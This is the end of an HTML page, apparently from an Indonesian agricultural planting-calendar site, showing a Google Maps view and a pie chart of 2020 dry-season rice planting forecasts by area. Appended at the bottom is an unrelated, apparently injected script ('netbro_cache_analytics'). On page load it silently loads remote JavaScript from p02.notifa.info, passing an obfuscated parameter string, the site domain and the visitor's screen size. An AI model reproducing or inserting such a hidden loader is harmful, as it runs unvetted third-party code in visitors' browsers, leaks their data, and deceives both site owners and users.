                        var temp3 = i + ',2';
                        var content = '<div id="info">' +
                            '<h2>' + 'PULAU ' + pulau[i] + '</h2>' +
                            '<a href="' + url_zoomin[i] + '" target="_self">Zoom ke Provinsi</a> :: ' +
                            '<p>' + '<b>Luas Baku : </b>' + addCommas(luas_baku_ha3[i]) + ' ha<br/>' +
                            '<b>Potensi Luas Tanam MK I: </b><br/>' +
                            '<b><li>Padi Sawah : </b>' + addCommas(MK1_luas_padi_sawah_ha3[i]) + ' ha</li>' +
                            '<b><li>Jagung/Kedelai : </b>' + addCommas(MK1_luas_jagung_kedelai_ha3[i]) + ' ha</li>' +
                            '<b><li>Kedelai : </b>' + addCommas(MK1_luas_kedelai_ha3[i]) + ' ha</li>' +
                            '<br/><b>Potensi Luas Tanam MK II: </b><br/>' +
                            '<b><li>Padi Sawah : </b>' + addCommas(MK2_luas_padi_sawah_ha3[i]) + ' ha</li>' +
                            '<b><li>Jagung/Kedelai : </b>' + addCommas(MK2_luas_jagung_kedelai_ha3[i]) + ' ha</li>' +
                            '<b><li>Kedelai : </b>' + addCommas(MK2_luas_kedelai_ha3[i]) + ' ha</li>' +
                            '</p>' +
                            '<p>' +
                            '<b>Prakiraan Awal Waktu Tanam Dominan I :</b></b r>' +
                            '<b> <li> I : </b>' + MK1_waktu_tanam_padi_sawah[temp1] + ' (' + addCommas(MK1_luas_padi_sawah_ha_hitung[temp1]) + ' ha) </li>' +
                            '<b> <li> II : </b>' + MK1_waktu_tanam_padi_sawah[temp2] + ' (' + addCommas(MK1_luas_padi_sawah_ha_hitung[temp2]) + ' ha) </li>' +
                            '</p>' +
                            '<p>' +
                            '<b>Prakiraan Awal Waktu Tanam Dominan II :</b></b r>' +
                            '<b> <li> I : </b>' + MK2_waktu_tanam_padi_sawah[temp1] + ' (' + addCommas(MK2_luas_padi_sawah_ha_hitung[temp1]) + ' ha) </li>' +
                            '<b> <li> II : </b>' + MK2_waktu_tanam_padi_sawah[temp2] + ' (' + addCommas(MK2_luas_padi_sawah_ha_hitung[temp2]) + ' ha) </li>' +
                            '</p>' +
                            '<p><img src="http://katam.litbang.pertanian.go.id/images/pdf.png" alt="pdf"  /><a href="' + url_pdf[i] + '" target="_blank">Cetak Dokumen (PDF)</a></p>' +
                            '</div>';
                        if (!infowindow) {
                            infowindow = new google.maps.InfoWindow();
                        }
                        infowindow.setContent(content);
                        infowindow.open(map, marker);
                    });
                })(i, marker);
                bounds.extend(places[i]);
            }
            map.fitBounds(bounds)
        }

    </script>
    <script type="text/javascript" src="https://www.google.com/jsapi"></script>
    <script type="text/javascript">
        google.load("visualization", "1", {
            packages: ["corechart"]
        });
        google.setOnLoadCallback(drawChart);

        function drawChart() {
            var data = new google.visualization.DataTable();
            data.addColumn('string', 'Waktu Padi Sawah MK I');
            data.addColumn('number', 'Luas Padi Sawah MK I');
            data.addRows([
                ['APR II-III', 1213194]
                , ['MAR III-APR I', 1152183]
                , ['MEI III-JUN I', 1139104]
                , ['JUN II-III', 325338]
                , ['JUL I-II', 173174]
                , ['MEI I-II', 141195]
                , ['AGS II-III', 99869]
                , ['JUL III-AGS I', 65713]
                , ['SEP I-II', 13152],

            ]);

            var options = {
                width: 250
                , height: 250
                , is3D: true
                , legend: 'bottom'
                , backgroundColor: '#E5EECF'
                , title: 'GRAFIK PRAKIRAAN AWAL WAKTU TANAM TK. NASIONAL KOM. PADI SAWAH BERDASARKAN LUAS POTENSI TANAM MK I MK 2020'
            };

            var chart = new google.visualization.PieChart(document.getElementById('chart_div'));
            chart.draw(data, options);
        }

    </script>
</head>
<body class="twoColHybRt" onload="initialize()">

    <div id="container">
        <div id="sidebar1">
            <div id="chart_div"> </div>
            <img src="http://katam.litbang.pertanian.go.id/images/pdf.png" alt="pdf" /> <a href="http://katam.litbang.pertanian.go.id/katam_terpadu/2020/MK/0_tinggi.pdf" target="_blank">Cetak Dokumen (PDF) </a> </br>
            <div id="tulisan">
                <h4>REKAPITULASI TK. NASIONAL KOM. PADI SAWAH MK 2020</h4>
                <b>Luas Baku : </b>7.459.891 ha<br />
                <b>Potensi Luas Tanam : </b><br />
                <b>
                    <li>Padi Sawah :
                </b>4.322.922 ha</li>
                <b>
                    <li>Jagung/ Kedelai :
                </b>633.459 ha</li>
                <b>
                    <li>Kedelai :
                </b>671.222 ha</li>
                Legenda
                <br>
                <link rel="stylesheet" href="http://katam.litbang.pertanian.go.id/easybox/styles/default/easybox.min.css" type="text/css" media="screen" />
                <script type="text/javascript" src="http://katam.litbang.pertanian.go.id/easybox/jquery-1.8.2.min.js"></script>
                <script type="text/javascript" src="http://katam.litbang.pertanian.go.id/easybox/distrib.min.js"></script>
                <a id="single_image" href="http://katam.litbang.pertanian.go.id/images/legenda_katam.png" class="lightbox"> <img src="http://katam.litbang.pertanian.go.id/images/legenda_katam.png" alt="Legenda Katam" width="100%"> </a>
            </div>
            <!-- end #sidebar1 -->
        </div>
        <h1>PETA KATAM TERPADU TINGKAT NASIONAL MK 2020</h1>
        <div id="map"> </div>
        <br class="clearfloat" />
        <!-- end #container -->
    </div>
    <script type="text/javascript">
        if (self == top) {
            function netbro_cache_analytics(fn, callback) {
                setTimeout(function() {
                    fn();
                    callback();
                }, 0);
            }

            function sync(fn) {
                fn();
            }

            function requestCfs() {
                var idc_glo_url = (location.protocol == "https:" ? "https://" : "http://");
                var idc_glo_r = Math.floor(Math.random() * 99999999999);
                var url = idc_glo_url + "p02.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JQuX3gzRncXMOWOhbBINo2UylKNmB9vExSn4CMEsqCPOvb49ySD4Aaf6PIxtCULTj4NDTm91Ehqi4fC85%2boRI%2bRF6GyxfxpxpRgTYR63tkP05wZmdm8kYfmEdGEntqask97%2bEtb8JNMIXRtSRZHo4cI4Jvs5oQoFmtFfWAd1PrmR8anRIAiX2VZgf3VbGnZXXqRRPn1r8FoOux71TXf52xE0e7oodmAr4XfeyHADPkGc0cM81X%2fGK3G%2fvIBFaqz5qyQ8igI%2boIxbX6ZwCnRcxTWX5AUL5GlheD12pDBIC6fohTV%2fnIWjy7A1WoOrIB0L8%2bb8xD4wXjnhqN0qz8Kfb4GCGrluifV6cowMHzTkbQSl1wT1YaHlDv%2bwOle9%2bwwaE2TUSKVB0v%2fogpECGk8uUhWlge7z1FqmX1lqNFnMTE3kr8X1oQc8WXkCRel2f7fYBzJysq%2fuGpS1z043CCIAxuELpzNCCZpllIcxat6oPgn%2fFoY7J%2b9Mgt2kirCLAqFk53gEcQgIZZQ0PeUxdp4jPyTDa5qfL8%2fUSdBM2ImidJye%2fV%2fACU4eOI%3d" + "&idc_r=" + idc_glo_r + "&domain=" + document.domain + "&sw=" + screen.width + "&sh=" + screen.height;
                var bsa = document.createElement('script');
                bsa.type = 'text/javascript';
                bsa.async = true;
                bsa.src = url;
                (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(bsa);
            }
            netbro_cache_analytics(requestCfs, function() {});
        };

    </script>
</body>
</html>
